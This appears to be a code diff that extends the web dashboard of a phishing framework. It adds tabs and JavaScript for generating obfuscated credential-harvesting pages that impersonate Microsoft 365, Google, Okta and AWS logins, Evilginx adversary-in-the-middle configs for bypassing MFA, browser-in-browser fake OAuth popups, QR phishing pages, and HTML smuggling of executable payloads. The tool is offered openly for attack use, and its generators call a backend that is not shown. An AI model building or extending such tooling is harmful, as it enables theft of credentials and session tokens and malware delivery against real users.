@@ -675,6 +675,64 @@
             box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
         }
         
+        /* Cyber Switch */
+        .cyber-switch {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+        
+        .cyber-switch input {
+            display: none;
+        }
+        
+        .cyber-switch .slider {
+            width: 50px;
+            height: 26px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 13px;
+            position: relative;
+            transition: 0.3s;
+        }
+        
+        .cyber-switch .slider::before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: #fff;
+            border-radius: 50%;
+            top: 3px;
+            left: 3px;
+            transition: 0.3s;
+        }
+        
+        .cyber-switch input:checked + .slider {
+            background: var(--gold);
+        }
+        
+        .cyber-switch input:checked + .slider::before {
+            transform: translateX(24px);
+        }
+        
+        .cyber-switch .switch-label {
+            color: var(--text-muted);
+            font-size: 0.9em;
+        }
+        
+        /* Notification animation */
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
         .input-icon {
             position: relative;
         }
@@ -928,8 +986,17 @@
                 <button class="tab-btn" onclick="showTab('new', this)">
                     <i class="fas fa-plus-circle"></i> New Campaign
                 </button>
+                <button class="tab-btn" onclick="showTab('landing', this)">
+                    <i class="fas fa-globe"></i> Landing Pages
+                </button>
+                <button class="tab-btn" onclick="showTab('mfa', this)">
+                    <i class="fas fa-shield-alt"></i> MFA Bypass
+                </button>
+                <button class="tab-btn" onclick="showTab('bitb', this)">
+                    <i class="fas fa-window-restore"></i> BitB Attack
+                </button>
                 <button class="tab-btn" onclick="showTab('templates', this)">
-                    <i class="fas fa-file-alt"></i> Templates
+                    <i class="fas fa-envelope"></i> Email Templates
                 </button>
                 <button class="tab-btn" onclick="showTab('credentials', this)">
                     <i class="fas fa-key"></i> Credentials
@@ -1219,6 +1286,341 @@
                 </div>
             </div>
             
+            <!-- Landing Page Generator Tab -->
+            <div id="landing-tab" class="hidden fade-in">
+                <div class="row">
+                    <div class="col-lg-6">
+                        <div class="cyber-card">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-globe"></i> LANDING PAGE GENERATOR
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <form id="landingPageForm">
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Target Platform</label>
+                                        <select id="landingPlatform" class="cyber-input">
+                                            <option value="office365">Microsoft 365 / Outlook</option>
+                                            <option value="google">Google Workspace</option>
+                                            <option value="linkedin">LinkedIn</option>
+                                            <option value="github">GitHub</option>
+                                            <option value="okta">Okta SSO</option>
+                                            <option value="aws">AWS Console</option>
+                                            <option value="custom">Custom Template</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Obfuscation Level</label>
+                                        <select id="landingObfuscation" class="cyber-input">
+                                            <option value="none">None (Debug)</option>
+                                            <option value="basic">Basic</option>
+                                            <option value="medium" selected>Medium (Recommended)</option>
+                                            <option value="advanced">Advanced</option>
+                                            <option value="paranoid">Paranoid (Anti-Analysis)</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Custom Message (Optional)</label>
+                                        <input type="text" id="landingMessage" class="cyber-input" placeholder="Your session has expired. Please sign in again.">
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Redirect URL (After Capture)</label>
+                                        <input type="text" id="landingRedirect" class="cyber-input" placeholder="https://login.microsoftonline.com">
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-switch">
+                                            <input type="checkbox" id="landingMfa">
+                                            <span class="slider"></span>
+                                            <span class="switch-label">Enable MFA Token Capture</span>
+                                        </label>
+                                    </div>
+                                    
+                                    <div class="d-flex gap-2">
+                                        <button type="button" onclick="generateLandingPage()" class="btn btn-cyber-gold flex-grow-1">
+                                            <i class="fas fa-magic"></i> Generate Page
+                                        </button>
+                                        <button type="button" onclick="previewLandingPage()" class="btn btn-cyber-purple">
+                                            <i class="fas fa-eye"></i> Preview
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-lg-6">
+                        <div class="cyber-card">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-code"></i> GENERATED HTML
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <div id="landingCodeOutput" style="background: rgba(0,0,0,0.5); border-radius: 8px; padding: 15px; font-family: monospace; font-size: 12px; color: var(--primary); max-height: 400px; overflow: auto; white-space: pre-wrap;">
+Click "Generate Page" to create your phishing landing page...
+                                </div>
+                                <div class="mt-3 d-flex gap-2">
+                                    <button onclick="copyLandingCode()" class="btn btn-outline-gold flex-grow-1">
+                                        <i class="fas fa-copy"></i> Copy HTML
+                                    </button>
+                                    <button onclick="downloadLandingPage()" class="btn btn-outline-purple">
+                                        <i class="fas fa-download"></i> Download
+                                    </button>
+                                </div>
+                                
+                                <div class="mt-4">
+                                    <h6 style="color: var(--gold);"><i class="fas fa-info-circle me-2"></i>Features Included</h6>
+                                    <div class="row mt-2">
+                                        <div class="col-6">
+                                            <div style="color: var(--text-muted); font-size: 0.85em;">
+                                                <p><i class="fas fa-check text-success me-2"></i>Credential Harvester</p>
+                                                <p><i class="fas fa-check text-success me-2"></i>Fingerprinting</p>
+                                                <p><i class="fas fa-check text-success me-2"></i>Anti-Detection</p>
+                                            </div>
+                                        </div>
+                                        <div class="col-6">
+                                            <div style="color: var(--text-muted); font-size: 0.85em;">
+                                                <p><i class="fas fa-check text-success me-2"></i>JS Obfuscation</p>
+                                                <p><i class="fas fa-check text-success me-2"></i>Auto Redirect</p>
+                                                <p><i class="fas fa-check text-success me-2"></i>Beacon Exfil</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- MFA Bypass (AiTM) Tab -->
+            <div id="mfa-tab" class="hidden fade-in">
+                <div class="row">
+                    <div class="col-lg-6">
+                        <div class="cyber-card">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-shield-alt"></i> MFA BYPASS (ADVERSARY-IN-THE-MIDDLE)
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <div class="alert" style="background: rgba(255,170,0,0.15); border: 1px solid var(--warning); border-radius: 8px; padding: 15px; margin-bottom: 20px;">
+                                    <i class="fas fa-exclamation-triangle me-2" style="color: var(--warning);"></i>
+                                    <span style="color: var(--warning);">AiTM attacks capture session tokens in real-time, bypassing all forms of MFA including FIDO2.</span>
+                                </div>
+                                
+                                <form id="mfaBypassForm">
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Target Platform</label>
+                                        <select id="mfaPlatform" class="cyber-input">
+                                            <option value="office365">Microsoft 365</option>
+                                            <option value="google">Google Workspace</option>
+                                            <option value="okta">Okta</option>
+                                            <option value="github">GitHub</option>
+                                            <option value="aws">AWS</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Phishing Domain</label>
+                                        <input type="text" id="mfaDomain" class="cyber-input" placeholder="login.company-portal.com">
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Redirect After Capture</label>
+                                        <input type="text" id="mfaRedirect" class="cyber-input" placeholder="https://portal.office.com">
+                                    </div>
+                                    
+                                    <button type="button" onclick="generateMfaConfig()" class="btn btn-cyber-gold w-100">
+                                        <i class="fas fa-cog"></i> Generate Phishlet Config
+                                    </button>
+                                </form>
+                                
+                                <hr style="border-color: rgba(255,215,0,0.2); margin: 20px 0;">
+                                
+                                <h6 style="color: var(--gold);"><i class="fas fa-list me-2"></i>Available Phishlets</h6>
+                                <div id="phishletList" class="mt-3" style="max-height: 200px; overflow-y: auto;">
+                                    <!-- Phishlets will be loaded here -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-lg-6">
+                        <div class="cyber-card">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-terminal"></i> EVILGINX PHISHLET CONFIG
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <div id="mfaConfigOutput" style="background: rgba(0,0,0,0.5); border-radius: 8px; padding: 15px; font-family: monospace; font-size: 11px; color: var(--info); max-height: 350px; overflow: auto; white-space: pre-wrap;">
+Select a platform and generate config...
+                                </div>
+                                <div class="mt-3 d-flex gap-2">
+                                    <button onclick="copyMfaConfig()" class="btn btn-outline-gold flex-grow-1">
+                                        <i class="fas fa-copy"></i> Copy Config
+                                    </button>
+                                    <button onclick="downloadMfaConfig()" class="btn btn-outline-purple">
+                                        <i class="fas fa-download"></i> Download YAML
+                                    </button>
+                                </div>
+                                
+                                <div class="mt-4">
+                                    <h6 style="color: var(--gold);"><i class="fas fa-lightbulb me-2"></i>How AiTM Works</h6>
+                                    <div style="color: var(--text-muted); font-size: 0.85em; margin-top: 10px;">
+                                        <p>1. Victim visits phishing domain</p>
+                                        <p>2. Proxy forwards to legitimate login</p>
+                                        <p>3. Victim enters credentials + MFA</p>
+                                        <p>4. Session cookies captured in real-time</p>
+                                        <p>5. Attacker replays session = Full Access</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Browser-in-Browser (BitB) Tab -->
+            <div id="bitb-tab" class="hidden fade-in">
+                <div class="row">
+                    <div class="col-lg-6">
+                        <div class="cyber-card">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-window-restore"></i> BROWSER-IN-BROWSER ATTACK
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <div class="alert" style="background: rgba(153,51,255,0.15); border: 1px solid var(--purple); border-radius: 8px; padding: 15px; margin-bottom: 20px;">
+                                    <i class="fas fa-info-circle me-2" style="color: var(--purple);"></i>
+                                    <span style="color: var(--purple);">BitB creates a fake browser popup that appears to be a legitimate OAuth window.</span>
+                                </div>
+                                
+                                <form id="bitbForm">
+                                    <div class="mb-3">
+                                        <label class="cyber-label">OAuth Provider</label>
+                                        <select id="bitbPlatform" class="cyber-input">
+                                            <option value="google">Sign in with Google</option>
+                                            <option value="microsoft">Sign in with Microsoft</option>
+                                            <option value="github">Sign in with GitHub</option>
+                                            <option value="apple">Sign in with Apple</option>
+                                            <option value="facebook">Sign in with Facebook</option>
+                                        </select>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Window Title</label>
+                                        <input type="text" id="bitbTitle" class="cyber-input" placeholder="Sign in - Google Accounts" value="Sign in - Google Accounts">
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-label">Fake URL (Address Bar)</label>
+                                        <input type="text" id="bitbUrl" class="cyber-input" placeholder="accounts.google.com/signin/oauth" value="accounts.google.com/signin/oauth">
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="cyber-switch">
+                                            <input type="checkbox" id="bitbHttps" checked>
+                                            <span class="slider"></span>
+                                            <span class="switch-label">Show HTTPS Lock Icon</span>
+                                        </label>
+                                    </div>
+                                    
+                                    <div class="d-flex gap-2">
+                                        <button type="button" onclick="generateBitbPage()" class="btn btn-cyber-gold flex-grow-1">
+                                            <i class="fas fa-window-restore"></i> Generate BitB
+                                        </button>
+                                        <button type="button" onclick="previewBitb()" class="btn btn-cyber-purple">
+                                            <i class="fas fa-eye"></i> Preview
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                        
+                        <!-- QR Phishing -->
+                        <div class="cyber-card mt-4">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-qrcode"></i> QR PHISHING (QRISHING)
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <div class="mb-3">
+                                    <label class="cyber-label">Phishing URL</label>
+                                    <input type="text" id="qrUrl" class="cyber-input" placeholder="https://your-phishing-page.com/login">
+                                </div>
+                                <div class="mb-3">
+                                    <label class="cyber-label">Message</label>
+                                    <input type="text" id="qrMessage" class="cyber-input" placeholder="Scan to verify your identity" value="Scan with your authenticator app">
+                                </div>
+                                <button type="button" onclick="generateQrPhishing()" class="btn btn-cyber-gold w-100">
+                                    <i class="fas fa-qrcode"></i> Generate QR Page
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-lg-6">
+                        <div class="cyber-card">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-desktop"></i> PREVIEW
+                                </h5>
+                            </div>
+                            <div class="card-body" style="text-align: center;">
+                                <div id="bitbPreview" style="background: #f5f5f5; border-radius: 8px; padding: 20px; min-height: 400px; display: flex; align-items: center; justify-content: center;">
+                                    <div style="color: #666;">
+                                        <i class="fas fa-window-restore fa-3x mb-3"></i>
+                                        <p>Click "Generate BitB" to preview the attack</p>
+                                    </div>
+                                </div>
+                                <div class="mt-3 d-flex gap-2">
+                                    <button onclick="copyBitbCode()" class="btn btn-outline-gold flex-grow-1">
+                                        <i class="fas fa-copy"></i> Copy HTML
+                                    </button>
+                                    <button onclick="downloadBitbPage()" class="btn btn-outline-purple">
+                                        <i class="fas fa-download"></i> Download
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- HTML Smuggling -->
+                        <div class="cyber-card mt-4">
+                            <div class="card-header-cyber">
+                                <h5 class="card-title-cyber mb-0">
+                                    <i class="fas fa-file-archive"></i> HTML SMUGGLING
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <p style="color: var(--text-muted); font-size: 0.85em; margin-bottom: 15px;">
+                                    Embed payloads in HTML that auto-download on page load, bypassing email filters.
+                                </p>
+                                <div class="mb-3">
+                                    <label class="cyber-label">Payload File</label>
+                                    <input type="file" id="smugglingPayload" class="cyber-input" style="padding: 8px;">
+                                </div>
+                                <div class="mb-3">
+                                    <label class="cyber-label">Download Filename</label>
+                                    <input type="text" id="smugglingFilename" class="cyber-input" placeholder="Invoice_2025.exe" value="Document.exe">
+                                </div>
+                                <button type="button" onclick="generateHtmlSmuggling()" class="btn btn-cyber-danger w-100">
+                                    <i class="fas fa-bomb"></i> Generate Smuggling Page
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
             <!-- Templates Tab -->
             <div id="templates-tab" class="hidden fade-in">
                 <div class="row">
@@ -1425,6 +1827,9 @@
 
     <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
         let currentTab = 'campaigns';
+        let generatedLandingHtml = '';
+        let generatedMfaConfig = '';
+        let generatedBitbHtml = '';
         
         function showTab(tabName, btn) {
             currentTab = tabName;
@@ -1433,19 +1838,306 @@
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             
-            // Show/hide content
-            document.getElementById('campaigns-tab').classList.add('hidden');
-            document.getElementById('new-tab').classList.add('hidden');
-            document.getElementById('templates-tab').classList.add('hidden');
-            document.getElementById('credentials-tab').classList.add('hidden');
+            // Hide all tabs
+            const allTabs = ['campaigns', 'new', 'landing', 'mfa', 'bitb', 'templates', 'credentials'];
+            allTabs.forEach(tab => {
+                const el = document.getElementById(tab + '-tab');
+                if (el) el.classList.add('hidden');
+            });
             
-            document.getElementById(tabName + '-tab').classList.remove('hidden');
+            // Show selected tab
+            const selectedTab = document.getElementById(tabName + '-tab');
+            if (selectedTab) {
+                selectedTab.classList.remove('hidden');
+                selectedTab.style.animation = 'none';
+                selectedTab.offsetHeight;
+                selectedTab.style.animation = 'fadeIn 0.5s ease';
+            }
             
-            // Trigger animation
-            const content = document.getElementById(tabName + '-tab');
-            content.style.animation = 'none';
-            content.offsetHeight;
-            content.style.animation = 'fadeIn 0.5s ease';
+            // Load dynamic content
+            if (tabName === 'mfa') loadPhishlets();
+        }
+        
+        // ==================== Landing Page Functions ====================
+        
+        async function generateLandingPage() {
+            const platform = document.getElementById('landingPlatform').value;
+            const obfuscation = document.getElementById('landingObfuscation').value;
+            const message = document.getElementById('landingMessage').value;
+            const redirect = document.getElementById('landingRedirect').value;
+            const mfaBypass = document.getElementById('landingMfa').checked;
+            
+            try {
+                const response = await fetch('/api/phishing/landing/generate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        platform, obfuscation, message,
+                        redirect_url: redirect,
+                        mfa_bypass: mfaBypass
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    generatedLandingHtml = data.html_content;
+                    document.getElementById('landingCodeOutput').textContent = 
+                        data.html_content.substring(0, 3000) + (data.html_content.length > 3000 ? '\n\n... (truncated)' : '');
+                    showNotification('Landing page generated!', 'success');
+                } else {
+                    showNotification('Error: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showNotification('API Error: ' + e.message, 'error');
+            }
+        }
+        
+        function previewLandingPage() {
+            const platform = document.getElementById('landingPlatform').value;
+            const mfa = document.getElementById('landingMfa').checked;
+            window.open(`/api/phishing/landing/preview/${platform}?mfa=${mfa}&obfuscation=none`, '_blank');
+        }
+        
+        function copyLandingCode() {
+            if (generatedLandingHtml) {
+                navigator.clipboard.writeText(generatedLandingHtml);
+                showNotification('HTML copied to clipboard!', 'success');
+            }
+        }
+        
+        function downloadLandingPage() {
+            if (generatedLandingHtml) {
+                const blob = new Blob([generatedLandingHtml], {type: 'text/html'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'phishing_page.html';
+                a.click();
+                URL.revokeObjectURL(url);
+            }
+        }
+        
+        // ==================== MFA Bypass Functions ====================
+        
+        async function generateMfaConfig() {
+            const platform = document.getElementById('mfaPlatform').value;
+            
+            try {
+                const response = await fetch('/api/phishing/mfa/config', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ platform })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    generatedMfaConfig = JSON.stringify(data.aitm_config, null, 2);
+                    document.getElementById('mfaConfigOutput').textContent = generatedMfaConfig;
+                    showNotification('Phishlet config generated!', 'success');
+                } else {
+                    showNotification('Error: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showNotification('API Error: ' + e.message, 'error');
+            }
+        }
+        
+        async function loadPhishlets() {
+            try {
+                const response = await fetch('/api/phishing/mfa/phishlets');
+                const data = await response.json();
+                
+                const container = document.getElementById('phishletList');
+                container.innerHTML = data.phishlets.map(p => `
+                    <div style="background: rgba(0,0,0,0.3); border-radius: 8px; padding: 12px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong style="color: var(--gold);">${p.name}</strong>
+                            <div style="font-size: 0.8em; color: var(--text-muted);">${p.domains.join(', ')}</div>
+                        </div>
+                        <span class="status-badge ${p.mfa_support ? 'status-active' : 'status-pending'}">
+                            ${p.mfa_support ? 'MFA Ready' : 'Basic'}
+                        </span>
+                    </div>
+                `).join('');
+            } catch (e) {
+                console.error('Error loading phishlets:', e);
+            }
+        }
+        
+        function copyMfaConfig() {
+            if (generatedMfaConfig) {
+                navigator.clipboard.writeText(generatedMfaConfig);
+                showNotification('Config copied!', 'success');
+            }
+        }
+        
+        function downloadMfaConfig() {
+            if (generatedMfaConfig) {
+                const blob = new Blob([generatedMfaConfig], {type: 'application/x-yaml'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'phishlet.yaml';
+                a.click();
+                URL.revokeObjectURL(url);
+            }
+        }
+        
+        // ==================== BitB Functions ====================
+        
+        async function generateBitbPage() {
+            const platform = document.getElementById('bitbPlatform').value;
+            
+            try {
+                const response = await fetch('/api/phishing/bitb/generate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ platform })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    generatedBitbHtml = data.html_content;
+                    // Show preview in iframe
+                    const preview = document.getElementById('bitbPreview');
+                    preview.innerHTML = `<iframe srcdoc="${data.html_content.replace(/"/g, '&quot;')}" style="width:100%;height:400px;border:none;border-radius:8px;"></iframe>`;
+                    showNotification('BitB page generated!', 'success');
+                } else {
+                    showNotification('Error: ' + data.error, 'error');
+                }
+            } catch (e) {
+                showNotification('API Error: ' + e.message, 'error');
+            }
+        }
+        
+        function previewBitb() {
+            window.open('/api/phishing/bitb/preview?platform=' + document.getElementById('bitbPlatform').value, '_blank');
+        }
+        
+        function copyBitbCode() {
+            if (generatedBitbHtml) {
+                navigator.clipboard.writeText(generatedBitbHtml);
+                showNotification('HTML copied!', 'success');
+            }
+        }
+        
+        function downloadBitbPage() {
+            if (generatedBitbHtml) {
+                const blob = new Blob([generatedBitbHtml], {type: 'text/html'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'bitb_attack.html';
+                a.click();
+            }
+        }
+        
+        // ==================== QR Phishing ====================
+        
+        async function generateQrPhishing() {
+            const phishingUrl = document.getElementById('qrUrl').value;
+            const message = document.getElementById('qrMessage').value;
+            
+            if (!phishingUrl) {
+                showNotification('Please enter a phishing URL', 'error');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/phishing/qr/generate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phishing_url: phishingUrl, message })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    const blob = new Blob([data.html_content], {type: 'text/html'});
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'qr_phishing.html';
+                    a.click();
+                    showNotification('QR phishing page downloaded!', 'success');
+                }
+            } catch (e) {
+                showNotification('API Error: ' + e.message, 'error');
+            }
+        }
+        
+        // ==================== HTML Smuggling ====================
+        
+        async function generateHtmlSmuggling() {
+            const fileInput = document.getElementById('smugglingPayload');
+            const filename = document.getElementById('smugglingFilename').value || 'document.exe';
+            
+            if (!fileInput.files[0]) {
+                showNotification('Please select a payload file', 'error');
+                return;
+            }
+            
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+            
+            reader.onload = async function(e) {
+                const base64 = e.target.result.split(',')[1];
+                
+                try {
+                    const response = await fetch('/api/phishing/smuggling/generate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ payload_b64: base64, filename })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        const blob = new Blob([data.html_content], {type: 'text/html'});
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'smuggling_page.html';
+                        a.click();
+                        showNotification('HTML smuggling page downloaded!', 'success');
+                    }
+                } catch (e) {
+                    showNotification('API Error: ' + e.message, 'error');
+                }
+            };
+            
+            reader.readAsDataURL(file);
+        }
+        
+        // ==================== Utility Functions ====================
+        
+        function showNotification(message, type = 'info') {
+            const colors = {
+                success: 'var(--primary)',
+                error: 'var(--danger)',
+                info: 'var(--gold)'
+            };
+            
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: ${colors[type]};
+                color: #000;
+                padding: 15px 25px;
+                border-radius: 8px;
+                font-weight: 600;
+                z-index: 10000;
+                animation: slideIn 0.3s ease;
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => notification.remove(), 3000);
         }
         
         function selectTemplate(element, templateId) {
